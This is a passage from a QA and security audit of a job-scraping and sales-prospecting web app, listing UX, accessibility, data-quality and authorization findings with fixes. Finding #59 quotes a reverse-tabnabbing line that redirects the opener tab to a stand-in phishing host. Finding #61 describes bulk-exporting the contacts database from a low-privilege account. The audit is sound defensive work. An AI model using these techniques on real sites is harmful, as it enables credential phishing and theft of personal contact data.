| 49 | 🔵 | Analytics | **Analytics "Total Jobs" card shows `47776` with no thousand separator.** Same number on Platforms page stat card shows `47,776` (correct). Platforms and Monitoring stat-card sections already call `.toLocaleString()`; Analytics / Dashboard / Companies / Intelligence / Pipeline / scan-by-platform grid do not. Cross-page formatting drift makes the same count look like two different numbers depending on where the user is | ⬜ open — same root fix as Finding #36 (centralize a `formatCount()` helper). Specifically on Analytics this affects `Total Jobs`, `Total Companies`, `Avg Relevance`, and the chart tooltip values |
| 50 | 🔵 | Analytics | **`Avg Relevance Score` differs between Dashboard and Analytics because of inconsistent rounding.** Dashboard top card renders `39.65`; Analytics stat card renders `40`. Same backend value, different display (`Math.round` vs `.toFixed(2)`). At 39.65 → 40 the discrepancy looks like stale data; users reconcile by debating which page is "right" | ⬜ open — pick one precision (recommend `.toFixed(1)` → `39.7`, which matches how the role-cluster score bars render) and apply it in both `DashboardPage.tsx` and `AnalyticsPage.tsx`. Future pages pull from the same `formatScore()` helper |
| 51 | 🟡 | Review Queue | **No keyboard shortcuts on Review Queue despite it being a queue-of-one workflow.** `/review` shows one job at a time with a "1 of 20" counter and Accept / Reject / Skip buttons. Pressing `J`, `K`, `ArrowLeft`, `ArrowRight`, `Space`, `Enter`, or typing `a`/`r`/`s` does nothing — the counter stays at `1 of 20`. Users review hundreds of jobs; forcing a mouse click per decision is multiple seconds of wasted time per review | ⬜ open — `ReviewQueuePage.tsx`: add a `useEffect(() => { window.addEventListener('keydown', …) }, [])` with `J`/`ArrowRight` → next, `K`/`ArrowLeft` → prev, `A` → accept, `R` → reject, `S` → skip. Show a `?` cheat-sheet dialog. Guard when focus is inside an `<input>` / `<textarea>` (compare `e.target.tagName`). This is a common sales-ops pattern (Front, Missive, Gmail) |
| 52 | 🟡 | A11y | **App-wide focus-ring coverage is very low.** Counted on four pages: `/role-clusters` 1 of 32 interactive elements carry `focus:ring` / `focus:outline` / `focus-visible` classes, `/review` 3 of 32, `/jobs` 2 of 27, `/settings` (after opening password form) 2 of 14. Keyboard-only users tabbing through the app lose track of focus on most controls. Icon-only buttons especially (sidebar sign-out, role-cluster action icons, feedback close-X) have no visible focus state at all | ⬜ open — two-part fix: (a) add a global `:focus-visible` rule in `index.css` so every interactive element gets a visible ring by default (`*:focus-visible { @apply outline-none ring-2 ring-primary-500 ring-offset-1; }`), then override per-component where the ring clashes with the design, (b) remove the handful of `outline-none` overrides that were added without a `focus-visible` replacement. Verification target: after the change, every button / link / input / select / textarea should show a ring when tabbed to |
| 53 | 🔵 | Feedback / Data cleanup | **Feedback list response ships a ~1 MB description row to every caller.** `GET /api/v1/feedback` on prod returns one ticket whose `description` field is approximately 1,000,000 characters of filler text — a leftover from Round 2's Finding #25 probe (20,000-char submission was accepted; a later test submitted 1 MB). Finding #25's code fix caps descriptions at 8000 chars on new submissions but doesn't touch existing rows. The row is served in full to every `/feedback` list request; the React table CSS-truncates it with `truncate` but the DOM carries the full string → measurable TTFB / DOM-weight regression. Not a security issue, but a data hygiene one | ✅ fixed: new `app/trim_oversized_feedback.py` script (modelled on `close_legacy_duplicate_feedback.py`) retroactively truncates legacy rows whose free-text fields exceed `_LONG_TEXT_MAX = 8000` — the same cap Finding #25 applied to new writes. Scans all 8 Pydantic-bounded columns (`description`, `steps_to_reproduce`, `expected_behavior`, `actual_behavior`, `use_case`, `proposed_solution`, `impact`, `admin_notes`), only loads rows where `func.length(col) > cap` (narrow scan, not full-table), appends ` [truncated legacy row]` marker so the retroactive cut is auditable in the UI. Idempotent + `--dry-run`. Run on prod: `docker compose exec backend python -m app.trim_oversized_feedback --dry-run`, then without the flag |
| 54 | 🟡 | Applications | **Applications page empty-state has no CTA and no explanation of how rows get created.** `/applications` with 0 rows renders `Total 0 · Applied 0 · Interview 0 · Offer 0` stat cards, 8 filter tabs, a table with `No applications found`, and no "Add Application" button anywhere. Users don't know whether apps appear automatically (from Review Queue accept?) or need manual entry. Dead-end until the user discovers the flow by accident | ⬜ open — `ApplicationsPage.tsx` empty-state: replace "No applications found" with an instructional block that links to the Review Queue and Jobs: *"No applications yet. Applications are created automatically when you apply to a job from its detail page, or mark a job as 'Applied' in the Review Queue."* Include `<Link to="/review">Open Review Queue</Link>` and `<Link to="/jobs?role_cluster=relevant">Browse Relevant Jobs</Link>` buttons |
| 55 | 🟡 | Applications | **Applications stat cards cover only 4 of the 8 filter statuses.** Filter tabs: `All · Prepared · Submitted · Applied · Interview · Offer · Rejected · Withdrawn`. Stat cards: `Total · Applied · Interview · Offer`. The `Prepared` / `Submitted` (pre-submit states) and `Rejected` / `Withdrawn` (negative outcomes) buckets are invisible in the overview — users only see the happy path. A pipeline that's 80% rejected looks identical to a pipeline that's 80% in-progress until you click each tab | ⬜ open — `ApplicationsPage.tsx`: either (a) collapse the stat-cards into 5 (`Total · In Progress (Prepared+Submitted+Applied+Interview) · Outcomes (Offer+Rejected) · Withdrawn`) so the overview has meaningful aggregates, or (b) render a small progress/funnel visualization that sums all 8. Current 4-card layout hides half the state |
| 56 | 🟡 | Pipeline | **Kanban cards are not clickable — no navigation to company detail from the pipeline.** On `/pipeline`, company names (`20four7VA`, `Cribl`, `Consensys`, `MoonPay`, `Wolfi (Chainguard)`, `Coreflight (Corelight)`, `Sophos`, `Canonical`, `name`) render as plain `<p class="text-sm font-semibold">`. The card container is a `<div>` with no `role` / `onclick` / `<a>` child. `document.querySelectorAll('main a').length === 0`. Clicking a card is a no-op. Users working the pipeline naturally want to click through to the Company detail (`/companies/{id}`) to review roles or enrich the row — no affordance to do that | ⬜ open — `PipelinePage.tsx` card body: wrap the heading in a `<Link to={`/companies/${card.company_id}`}>`, or make the card itself a link (`<Link>` wraps the whole card, `role="article"`). Keep the two stage-move buttons (Move previous / Move next) as `stopPropagation` so clicking them doesn't also fire the card click |
| 57 | 🔵 | Pipeline / UX | **Kanban has no drag-and-drop; stage changes require per-card button clicks.** Each card has two icon-only buttons (`Move to previous stage`, `Move to next stage`) with `title` attribute (same `title` vs `aria-label` issue as Finding #45). Moving a card from `New Lead` → `Engaged` takes 4 forward-clicks per card. There are 10 cards in pipeline today, which stays manageable; at 50+ cards the friction shows. Not a functional bug but a common kanban affordance users will expect | ⬜ open (optional) — `PipelinePage.tsx`: add HTML5 drag-drop (`draggable="true"`, `onDragStart` / `onDragOver` / `onDrop` handlers) or adopt a small lib like `@dnd-kit/core`. Keep the existing arrow buttons as the accessible fallback — keyboard users can't drag. Emit the same `PATCH /api/v1/pipeline/{id} {stage}` on drop |
| 58 | 🟡 | Companies / Jobs | **Company list cards AND Jobs table rows navigate via `div|tr.onClick` instead of `<a>`, breaking standard web-nav affordances.** `/companies`: each card is `<div class="cursor-pointer group" onClick={…}>` → `navigate('/companies/{id}')`. `/jobs`: each row is `<tr class="cursor-pointer hover:bg-gray-50" onClick={…}>` → `navigate('/jobs/{id}')`. Neither has an `<a>` inside, `tabindex`, or `role="link"`. Consequences across both pages: (a) middle-click and Ctrl/Cmd-click don't open in a new tab, (b) right-click → "Open in new tab" / "Copy link" don't work, (c) keyboard users can't Tab to the row/card, (d) screen readers announce generic container instead of a link. Additionally, `/companies/{id}` detail view's "Open Roles: N" is plain text instead of a link to `/jobs?company_id={id}` | ⬜ open — two patches: `CompaniesPage.tsx` replaces `<div onClick={navigate}>` with `<Link to={…} className="block …">`, nested buttons use `e.preventDefault();e.stopPropagation()`. `JobsPage.tsx` restructures the table: either (a) change the `<tr>` to `<tr><td><Link to="/jobs/{id}">` inside each cell (accessible) or (b) wrap the whole row in a `TableRowLink` component that stacks an invisible `<a>` covering the row + `position:relative` on the `<tr>`. Same approach on `CompanyDetailPage.tsx` for the `Open Roles` metric |
| 59 | 🟠 | Security / XSS-adjacent | **External links on `/jobs/{id}` open in new tabs **without** `rel="noopener noreferrer"` — reverse-tabnabbing vector.** On a live Job Detail page (alphasense/greenhouse), `document.querySelectorAll('main a')` surfaces three external links: "View Original Listing" → Greenhouse (has `rel="noopener noreferrer"` ✅), "alpha-sense.com" → `target="_blank" rel="(none)"` ❌, "Careers page" (company career url) → `target="_blank" rel="(none)"` ❌. The two un-hardened anchors use `Company.website` and `Company.careers_url`. An attacker whose domain becomes a company `website`/`careers_url` (via manual admin-add, or a compromised scrape) can use `window.opener.location = 'https://phishing.example'` from the opened tab to redirect the user's original sales-platform tab to a phishing clone of the login page. Users click back to the original tab, see the login page, and re-enter credentials | ⬜ open — in `JobDetailPage.tsx` (and anywhere else `Company.website` / `Company.careers_url` / arbitrary ATS URLs are rendered): every `<a target="_blank">` must have `rel="noopener noreferrer"`. Simplest fix: add a small `<ExternalLink href={url}>…</ExternalLink>` component with those attrs baked in and replace every `<a target="_blank">` on the page. Browser behavior changed in Chrome 88 / Firefox 79 (implicit `noopener` when `target="_blank"`), but Safari and older browsers still leak `window.opener`, so the explicit `rel` is still required by modern security guides (OWASP: Reverse Tabnabbing) |
| 60 | 🟠 | Data Quality / Export | **`/api/v1/export/contacts` emits 445 (11.8%) garbage contact rows where `first_name` is an English stop-word.** Parsed the full 3,756-row CSV with a proper quoted-CSV parser. 445 rows have `first_name` in {"help","for","the","apply","learn","us","to","in","with","on","what","our","your","at"…}, of which 148 have BOTH `first_name` AND `last_name` as stop-words (e.g. `{company:"Abbott", first:"help", last:"you", title:"Recruiter / Hiring Contact"}`, `{company:"Airbnb", first:"us", last:"at", …}`, `{company:"AbbVie", first:"for", last:"the", …}`). All 445 have `source="job_description"`, all have `email=""`, `phone=""`, `linkedin_url=""` — **zero actionable contact info**. Every single one has `title="Recruiter / Hiring Contact"` (1,348 rows total, 36% of the whole export). The root cause is the `job_description` contact-extractor: a regex like `/contact ([A-Za-z]+) ([A-Za-z]+)/` is matching on phrases like *"contact us at…"*, *"help you apply"*, *"for the role"*, *"learn more about our team"* — two adjacent tokens after a trigger word are treated as `first_name last_name` with no English-word validation, no length check, and no case-sensitivity filter (proper names are capitalized; stop-words aren't). Result: sales team sees a contacts table bloated with noise and wastes review cycles triaging phantom "Recruiter" rows. Also: `phone` and `telegram_id` columns are exported but **never populated** (0 / 3756 rows). | ✅ fixed: **root cause was a regex scope bug**, not just a stop-word problem. The pre-existing `_CONTACT_PATTERN` in `services/enrichment/internal_provider.py` used global `re.IGNORECASE`, which made the supposed Capital-Initial capture `([A-Z][a-z]+\s+[A-Z][a-z]+)` match any-case words — so "contact us at" captured `("us","at")`, "help you apply" captured `("help","you")`, etc. Fix is layered: (a) scope the IGNORECASE flag to just the trigger alternation via `(?i:contact\|recruiter\|…)`, so the name capture genuinely requires uppercase initials. (b) Add post-match `_looks_like_real_name()` that rejects tokens in `_NAME_STOPWORDS` (46-word English stop-list), enforces 2–20 char length, and requires `[A-Z][a-z]+` shape — belt-and-suspenders against any prose noise that still satisfies Capital-Initial rules ("Our Team", "Let Us"). (c) Retroactive cleanup: new `app/cleanup_stopword_contacts.py` (mirror of `close_legacy_duplicate_feedback.py`) applies the same predicate to existing rows, scoped to `source='job_description'` only (other sources use real email-parsing logic), with `--dry-run` + chunked DELETE in batches of 500. Stop-word set is kept in lockstep with the ingest filter via comments in both files. `phone` / `telegram_id` CSV-column removal is covered separately in Finding #62 |
| 61 | 🟠 | Auth / Data Exfiltration | **All three bulk-export endpoints gate on "logged in" only — any viewer can download the entire contacts/jobs/pipeline database.** Read `platform/backend/app/api/v1/export.py` directly: `/export/jobs`, `/export/pipeline`, and `/export/contacts` all have `user: User = Depends(get_current_user)` — no `require_role(…)`. Viewer (the lowest privilege tier) gets the same CSV as admin: 3,756-row / 640 KB contacts dump including `is_decision_maker`, `email`, `email_status`, and all outreach metadata. Fetched as admin on prod: `GET /api/v1/export/contacts` → 200, Content-Length ≈ 640,000 bytes, no pagination, no rate-limit. The `/companies` page shows a prominent "Export Contacts" button (`<a href={exportContactsUrl()}>`) to every logged-in role — `CompaniesPage.tsx` line 88 has no role-guard around the button. Consequence: **a single compromised viewer account (e.g. a contractor given read-only access for onboarding) can exfiltrate the entire prospect list in one HTTP GET.** No audit log entry is written for exports (no visible signal anywhere in `/monitoring`). Also: query has no `LIMIT`, no streaming-chunk size guard, no tenant filter — everything relies on single-tenant assumption | 🟡 partial: **backend role gate fixed** — all three endpoints in `api/v1/export.py` (`/export/jobs`, `/export/pipeline`, `/export/contacts`) now depend on `_EXPORT_ROLE_GUARD = require_role("admin")` instead of `get_current_user`. A compromised viewer or reviewer account can no longer dump the database in one GET — the server returns 403. Gate is `admin`-only for now (tightest safe default); loosening to reviewer is easy if product decides sales reviewers are a legitimate export audience. **Frontend hide-the-button still open** — `CompaniesPage.tsx` line ~88 still renders "Export Contacts" to every logged-in role; clicking it as viewer/reviewer now hits a 403 instead of succeeding, but the button is still a confusing dead-end for non-admins. That's tester-owned scope (`user.role === "admin"` conditional). **Audit-log table still open** — separate follow-up; adding an `audit_log` model + migration is a bigger piece of work than this single commit |
| 62 | 🔵 | Data / Export | **Export CSV has two columns that are always empty; confusing for consumers.** Fully parsed the live `/api/v1/export/contacts` CSV: `phone` has 0 / 3,756 values populated; `telegram_id` has 0 / 3,756 values populated. Column headers are present in the CSV and in `CONTACT_CSV_COLUMNS` in `api/v1/export.py`. Sales team pulling this into their CRM / spreadsheet sees two "dead" columns and has no signal about whether the data is *missing* (bug) or *never collected* (product scope). Related: `last_outreach_at` and `outreach_note` are also empty in the current sample but that's expected (no outreach activity yet) — those become meaningful once sales starts working the list. `phone`/`telegram_id` won't fill themselves | ✅ fixed: option (b) taken — `CONTACT_CSV_COLUMNS` in `api/v1/export.py` no longer lists `phone` or `telegram_id`, and the row-builder in `export_contacts` stops appending them. CSV headers and row values are kept in lockstep (a comment flags that the two must move together). The columns remain on the `CompanyContact` model — this change is purely about the export surface. An inline comment flags the columns for re-addition once enrichment starts populating them, so restoring them is a one-line revert if/when Hunter.io/Apollo/Clearbit integration lands |
| 63 | 🟡 | Admin / API Drift | **The `/api/v1/rules` admin API is orphaned AND its cluster whitelist is out of sync with `role_clusters_configs`.** Backend registers `rules.router` and exposes `GET/POST/PATCH/DELETE /api/v1/rules`, but there is no `RulesPage.tsx`, no `listRules/createRule` in `lib/api.ts`, no nav entry, and only ONE stale row exists in the DB (seeded `cluster="infra", base_role="infra"`). More critically, `POST /api/v1/rules` and `PATCH /api/v1/rules/{id}` hardcode `if body.cluster not in ("infra", "security"): raise HTTPException(400, "Cluster must be 'infra' or 'security'")` — but `/api/v1/role-clusters` currently returns 3 clusters (`infra`, `qa`, `security`) with `relevant_clusters=["infra","qa","security"]` and 509 jobs are already classified as `role_cluster="qa"`. Tried `POST /api/v1/rules {cluster:"qa", base_role:"qa", keywords:["qa engineer"]}` live → 400 "Cluster must be 'infra' or 'security'". So the Rules API *lies* about its supported domain, and any future admin trying to use it hits a dead end as soon as a custom cluster is added | ⬜ open — two paths: (a) **wire up a frontend** for `/rules` AND swap the hardcoded whitelist for a dynamic lookup against `role_cluster_configs.name` (so any active cluster is a valid rule target), OR (b) **delete the orphan** — remove `rules.router` from `router.py`, drop `models/rule.py` + `schemas/rule.py` + `api/v1/rules.py`, migrate the orphan seed row out. If the intent is "Role Clusters" absorbs this functionality, formalise that in CLAUDE.md and delete the ghost API |
| 64 | 🟠 | Intelligence / Data Quality | **`_looks_like_corrupted_contact()` filter on `/api/v1/intelligence/networking` only inspects `first_name` for run-together capitals — misses the exact `{first:"Gartner", last:"PeerInsights"}` case its own docstring calls out.** Live call: `GET /api/v1/intelligence/networking` returns top suggestion `{name:"Gartner PeerInsights", title:"Wade BillingsVP, Technology Services, Instructure", is_decision_maker:true, email_status:"catch_all"}`. The filter reads: `internal_caps = sum(1 for i, c in enumerate(fn) if i > 0 and c.isupper()); if internal_caps >= 2: return True` — critically, `fn` is `first_name`, not `last_name`. "Gartner" has 0 internal caps so it passes; "PeerInsights" would fail the check but is never examined. Similarly `{first:"Wade", last:"BillingsVP"}` from the title pattern: `fn="Wade"` → 0 internal caps → passes. The title-length and 3-comma-segment checks later in the function would have caught *some* of these but apparently are either bypassed by prod deploy lag (the filter was added for regression #27 and may not be live yet — same deploy-staleness tracked as #32) or the current deployed filter lacks these checks entirely | ⬜ open — `api/v1/intelligence.py` `_looks_like_corrupted_contact()`: extend the `internal_caps` check to both `fn` AND `ln` (e.g. `for name in (fn, ln): if sum(...) >= 2: return True`). Also add the stop-word filter from Finding #60 here so rows like `{first:"help", last:"you"}` are caught (in case a future bug lets those bypass email_status filter on the general branch). Deploy and verify on prod that "Gartner PeerInsights" disappears from the first page of networking suggestions |
| 65 | 🟡 | Intelligence / Data | **`/api/v1/intelligence/timing` still recommends "Sunday" as the best day to apply despite the per-second workaround from Finding #26.** Live counts:  Sunday 23,696 · Monday 6,496 · Tuesday 5,456 · Wednesday 4,803 · Thursday 3,020 · Friday 2,384 · Saturday 1,921. Sunday is 4.3× the next-highest day. Even with the query's filter `AND ABS(EXTRACT(EPOCH FROM (posted_at - first_seen_at))) > 1` (intended to exclude seed-run rows where `posted_at==first_seen_at`), Sunday dominates — so either (a) the bulk seed wrote slightly-different values in both columns, defeating the equality check, or (b) some ATS batches genuinely post en-masse on Sunday (Greenhouse/Lever weekly batch jobs?). Result: the user-facing *"best_day"* recommendation is `"Sunday"`, which is empirically wrong for most user-driven posting workflows (HR teams post Tue/Wed/Thu mornings in North America). The "ideal apply window" text `"Apply within 24-48 hours of posting for best results"` is also static copy with no data backing | ⬜ open — tighten the filter: instead of comparing `posted_at vs first_seen_at` absolute seconds, exclude rows whose `first_seen_at` falls inside a *seed-run window* (look at the `scan_log` table for runs with `jobs_ingested > 1000` and exclude any job whose `first_seen_at` is within those run windows). Alternatively, look at `posted_at.time()` — if 80%+ of same-day jobs share the exact same second/minute, they're programmatically assigned, not truly posted. For the static recommendation copy, tie it to the top-3 `posting_by_hour` entries (`"Apply Mon–Wed 9-11am for X% higher callback rate"`) once enough accepted/rejected data exists |
| 66 | 🟡 | Intelligence / Salary | **Salary parser in `_parse_salary()` recognises only £/GBP and €/EUR; everything else defaults to `"USD"` — so DKK / SEK / NOK / CAD / AUD / SGD / JPY salaries are mislabelled and skew the "top paying" list.** Live `/api/v1/intelligence/salary` top entry: `{company:"Pandektes", raw:"DKK 780000 - 960000", currency:"USD", mid:870000, title:"Senior Backend Engineer"}`. 780,000 DKK ≈ $112,000 USD — but the Intelligence dashboard displays it as $870,000 USD (~8× over-reported). Same for `{raw:"USD 750000 - 980000", company:"Haldren Group"}` where the raw value is almost certainly an upstream ATS bug (no "Commercial Manager, New Accounts" earns $870K), and `{raw:"DKK …"}` style rows. Source: `_parse_salary()` lines 158-163 — currency detection has only two branches (`"£"/"gbp"`, `"€"/"eur"`), `currency="USD"` default. The numbers are still treated as dollars in the mid/avg/median rollups, so the `overall.avg=$135,740` is inflated, and the `by_cluster.other.max=$870,000` is a Danish krone number misread as dollars | ⬜ open — extend the currency detection in `api/v1/intelligence.py` `_parse_salary()`:  `if "dkk" in s: currency="DKK"` and likewise for `sek, nok, cad, aud, nzd, sgd, hkd, jpy, inr, zar`. Either (a) convert everything to USD at display time using a static FX table committed to the repo (updated monthly), or (b) keep the native currency but **exclude non-USD rows from the "top paying" ranking** (show them in a separate panel grouped by currency). The current state of reporting a DKK salary as USD is actively misleading to the user |
| 67 | 🔵 | Intelligence / Salary | **Salary insights are dominated by `role_cluster="other"` because the query has no relevance filter.** `/api/v1/intelligence/salary` response: `by_cluster: { other: 875 salaries, infra: 22, security: 10, qa: 10 }` — 95% of the displayed data is from jobs outside the user's target clusters. The Intelligence page is presented as "salary insights for your target roles", but the backend query is `select(Job.salary_range, ...) .where(Job.salary_range != "")` with NO `Job.relevance_score > 0` filter, NO role-cluster filter. Optional `role_cluster` and `geography` query params let the caller narrow, but the default response — which is what the UI fetches — aggregates all jobs. Consequence: the "overall" stats (`avg=$135,740`, `median=$110,000`) are dominated by unrelated roles | ⬜ open — two choices: (a) change the default in `salary_insights()` to filter `.where(Job.relevance_score > 0)` so the base `overall` stats reflect relevant roles, and add an explicit `?include_other=true` param for admins who want the full-DB view, OR (b) keep the default unchanged but have the frontend `IntelligencePage.tsx` always pass `?role_cluster=infra|security|qa` when showing salary stats. Option (a) is cleaner and matches Intelligence page framing |

---

## 2. UI / UX

### 2.1 Navigation & Layout
- ✅ Sidebar renders all pages for `admin`: Dashboard, Relevant Jobs, All Jobs, Review Queue, Companies, Platforms, Resume Score, Answer Book, Credentials, Applications, Pipeline, Analytics, Intelligence, Feedback, Docs.
- ✅ Admin section correctly renders Monitoring, Role Clusters, Settings.
- ✅ Sidebar source hides `User Management` behind `role === "super_admin"` check, matching spec.
- 🟡 **Finding 8**: `Settings` is declared in `adminNavigation` array. Reviewers & viewers still have `/settings` as an open route but lack the sidebar entry — inconsistent.
- 🔵 **Finding 9**: On Dashboard, the `1864 jobs` counter in the Security column header wraps to 2 lines at 1728×855 because of the long section title. Cosmetic, fixable with truncation or smaller badge.

### 2.2 Forms & Inputs
- ✅ Login form: email validation via HTML5 `type=email`; server responds `422` for invalid format, `401` for bad credentials.
- ✅ Password reset request returns a generic "If the email exists…" response regardless of existence (good — no email enumeration).
- 🟠 **Finding 3**: On `/jobs`, each row has an `onClick` to navigate to job detail. The checkbox inside the row doesn't stop propagation, so clicking the checkbox navigates instead of selecting. Bulk actions documented in `/docs` cannot be performed from the UI.

### 2.3 Pagination
- ✅ Companies (133 pages), Jobs (multi-page), Feedback (2 pages) all render Prev / Next / numbered controls.

### 2.4 Filters & Sort (Jobs page)
- ✅ Platform filter works (`greenhouse` → 13,087; matches Monitoring).
- ✅ `role_cluster=security` returns 1,864 jobs, matching the dashboard badge — consistent.
- ✅ Status, Geography, Role, Sort dropdowns all render with full option sets.
- 🟠 **Finding 4**: Search box is labelled "Search jobs by title **or company**" but company search is broken — `Bitwarden` → 0 results even though Bitwarden jobs appear on the Dashboard. `Stripe` → 3 (plausible but suspicious given the 10+ Stripe jobs visible on Dashboard recent list). Title search works (e.g. `Senior Security Engineer` → 48).

---

## 3. Features

### 3.1 Authentication
| Scenario | Expected | Actual |
|---|---|---|
| Valid admin creds | 200 + cookie | ✅ 200, `/me` returns `role: "admin"` |
| Reviewer creds from cred sheet | 200 | ❌ **401** `Invalid email or password` |
| Viewer creds from cred sheet | 200 | ❌ **401** `Invalid email or password` |
| Bogus creds | 401 | ✅ 401 `Invalid email or password` |
| Invalid email format | 422 | ✅ 422 pydantic validation |
| Reset-password request (unknown email) | 200 generic | ✅ 200 `If the email exists…` — no enumeration |
| Wrong reset-password path (`/password-reset-request`) | 404 | ✅ 404 (endpoint lives at `/reset-password/request`) |

Observation: rate limiting is aggressive — several consecutive bad logins flipped to `503` for ~10s. Good for abuse resistance but was intermittently hit during normal retesting.

### 3.2 Jobs
- ✅ `/api/v1/jobs` pagination returns `{ items, total }`, total = 47,072, matches Monitoring.
- ✅ Job detail page: title, company, platform, status, score breakdown (Title 40%, Company 20%, Geo 20%, Source 10%, Freshness 10%), Quick Actions (Accept/Reject), AI Tools (Cover Letter, Interview Prep), Review Comment/Tags, Review History.
- ✅ Readiness checks on detail: "No active resume", "No credentials for greenhouse", "No answers yet" before `Apply` is enabled.
- 🟠 Finding 3 (bulk-select) documented above.
- 🟠 Finding 4 (company search) documented above.

### 3.3 Review Queue
- ✅ Shows "20 jobs awaiting review" with cursor `1 of 20`.
- ✅ Rejection tag chips: Location, Seniority, Not Relevant, Salary, Company, Duplicate.
- ✅ Skip advances counter (1 of 20 → 2 of 20).
- ⚠️ Accept / Reject not exercised to avoid mutating production data.

### 3.4 Companies
- ✅ 6,638 companies tracked; filters for Target / Has Contacts / Actively Hiring / Recently Funded; funding-stage chips; 3 sort modes.
- ✅ Company detail loads with Overview, Hiring Velocity, Open Roles, Enrich Now button, Hiring Locations, Key People table, ATS Boards.
- ✅ For enriched companies (e.g. 1Password, enriched 4/6/2026) the Key People table renders 11 C-suite contacts with outreach status pills (Not contacted / Emailed / Replied / Meeting scheduled / Not interested).
- 🟡 Even enriched companies show `--` for Industry, Size, Founded, Headquarters, Funding and all contact emails — fields are blank. Suggests enrichment is only populating names/titles.

### 3.5 Pipeline
- ✅ Kanban board with stages: New Lead (9), Researching (1), Qualified (0), Outreach (0), Engaged (0), Disqualified (0).
- ✅ Each card shows open roles, priority, accepted/total, last job date, created date.
- ✅ `Add Stage` button visible for admins.
- 🔵 **Finding 10**: Card titled "1name" in Researching stage — almost certainly test data.

### 3.6 Platforms
- ✅ All 14 configured platforms listed with active/total boards, total jobs, accepted, avg score, last-scan time.
- 🟡 **Finding 7**: Stats show `himalayas` 1/1 active + **180 errors** on last scan; `bamboohr 5/5 active → 0 jobs`; `jobvite 5/5 active → 0 jobs`; `recruitee 8/8 active → 0 jobs`; `wellfound 10/10 active → 0 jobs`. Either boards are broken fetchers or those platforms have no relevant openings, but `0 jobs` across a full active roster usually indicates a scraping failure.
- ✅ Scan logs are exposed per platform.

### 3.7 Analytics
- ✅ 7d / 30d / 90d range toggle.
- ✅ Totals: 47,072 jobs, 9 accepted, 1 rejected, 90.0% acceptance rate, avg score 40.
- ✅ Acceptance by Platform table: himalayas 100%, lever 100%, weworkremotely 100%, greenhouse 80%.
- 🟡 **Finding 6**: `Job Trends (30d)` chart shows `NaN/NaN` six times where axis tick labels should be. Likely date math on an empty/`undefined` series.
- 🟡 `Source Distribution` chart and `Pipeline Funnel` chart render but with mostly empty data; Applications Funnel shows "No platform data available".

### 3.8 Resume Score
- ✅ Upload UI (PDF/DOCX, max 5MB).
- ✅ "No resumes uploaded yet" empty state.
- ⚠️ End-to-end upload+score not exercised (requires producing a resume; avoided side-effects on production DB).

### 3.9 Applications
- ✅ Status tabs render: All / Prepared / Submitted / Applied / Interview / Offer / Rejected / Withdrawn.
- ✅ "No applications found" empty state for fresh test account.

### 3.10 Answer Book
- ✅ 13 entries, category tabs (Personal Info 0/5, Work Authorization 0/0, Experience 0/1, Skills 0/0, Preferences 0/0, Custom 0/7).
- ✅ Entries discovered via `ats_discovered` source (e.g. visa sponsorship, target compensation, time-zone confirmation).

### 3.11 Credentials
- ✅ "No active resume selected" guard — correctly prevents credential management without persona.

### 3.12 Intelligence
- ✅ Tabs: Skill Gaps, Salary Intel, Timing, Networking. Role cluster filter (All / Infra / Security / QA).
- ✅ Empty state prompts to upload a resume before showing skills coverage. Good UX.

### 3.13 Feedback (Tickets)
- ✅ 27 tickets total (16 Open, 0 In Progress, 6 Resolved), category & status filters, pagination (2 pages).
- 🔵 **Finding 11**: 8+ identical "Resume Score / Relevance" tickets from `Khushi Jain` on 4/14. Needs dedup or a "known issue" pin.
- ℹ️ Several existing tickets already overlap with bugs I found (see Finding 4 — "Search Bar" ticket from Khushi Jain: "Bitwarden exists in All Jobs section, but when I search it on searching bar, the interface shows 'No Jobs Found.'").

### 3.14 Docs
- ✅ Loads as a guided playbook (First-Time Setup → Daily Workflow → Reference). No broken sections observed.

### 3.15 Settings (self)
- ✅ Profile block (Name `Test Admin`, Email, Role `admin`, Member Since `April 10, 2026`).
- ✅ `Change Password` CTA.
- ✅ `Job Alerts` section with "Add Alert" and empty state referencing Google Chat notifications.

---

## 4. Admin Features

### 4.1 Monitoring
- ✅ System header: "All systems operational", Uptime 26m.
- ✅ Scan Controls: Full Platform Scan + Discover New Platforms.
- ✅ Per-platform scan tiles (with Run button) for 14 platforms.
- ✅ DB section: 343.1 MB total, per-table sizes (jobs 273 MB, scan_logs 32.8 MB, …).
- ✅ Activity (24h): Scans 1742, new jobs 2403, errors 0, last scan @ 1:49 PM greenhouse/dell.
- ✅ Breakdown charts: Role Cluster (unclassified 90%, infra 5%, security 4%, qa 1%), Geography (70.2% unclassified, 26.5% usa_only, 2.9% global_remote, 0.4% uae_only), Platform (himalayas 33.7%, greenhouse 27.8%, lever 25.7%, …), Status (new 99.9%, under_review 0.1%, accepted 9, rejected 1).
- ✅ Auto-refresh every 30s.

### 4.2 Role Clusters
- ✅ Three clusters render: `infra`, `qa`, `security` — all marked Relevant. Keywords + Roles expand correctly ("+19 more", "+16 more", etc.).
- ℹ️ Matches `CLAUDE.md` default of infra+security plus an added `qa` cluster.

### 4.3 User Management (`/users`)
- 🟠 **Finding 5**: Admin (non-super_admin) gets `403` from `GET /api/v1/users` and UI silently renders:
  `admins 0 · reviewers 0 · viewers 0` with empty table. Should render a permission-denied state instead of zeros, or the nav item should also be gated to `super_admin` only (it is in the sidebar source, but the route itself is reachable by URL).

---

## 5. Data Validations

### 5.1 Count Consistency
| Source | Count |
|---|---|
| Dashboard "Companies" widget | **5,827** |
| Monitoring "Companies" | **6,638** |
| `/companies` "… companies tracked" | **6,638** |
| Dashboard "Total Jobs" | 47,072 |
| Monitoring "Total Jobs" | 47,072 |
| `/jobs` total | 47,072 |

- 🔴 **Finding 2**: Dashboard under-counts companies by 811. Likely two different queries (Dashboard excluding something like 0-jobs companies, Monitoring counting all).

### 5.2 Role-Cluster Cross-check
- Dashboard shows: infra 2,357 · security 1,864 · qa 506 · global_remote 1,366 · relevant 4,727.
- 2,357 + 1,864 + 506 = 4,727 ✅ matches "Relevant" total.
- Monitoring: `unclassified 42,345 + infra 2,357 + security 1,864 + qa 506 = 47,072` ✅.

### 5.3 Acceptance Counts
- Dashboard `Accepted 9`. Monitoring `accepted 9`. Analytics `accepted 9`. Consistent. ✅

### 5.4 Input Validation
- ✅ Login: invalid email format → 422 pydantic.
- ✅ Login: empty password → validation error.
- ✅ Reset-password request: unknown email → 200 generic (no enumeration).
- ⚠️ Did not test: minimum password length on password-change, resume MIME/size enforcement, tag length limits in Review Queue.

---

## 6. E2E Flows Exercised

| Flow | Result |
|---|---|
| Login → Dashboard | ✅ |
| Dashboard → Jobs → filter by `role_cluster=security` → count matches Dashboard (1,864) | ✅ |
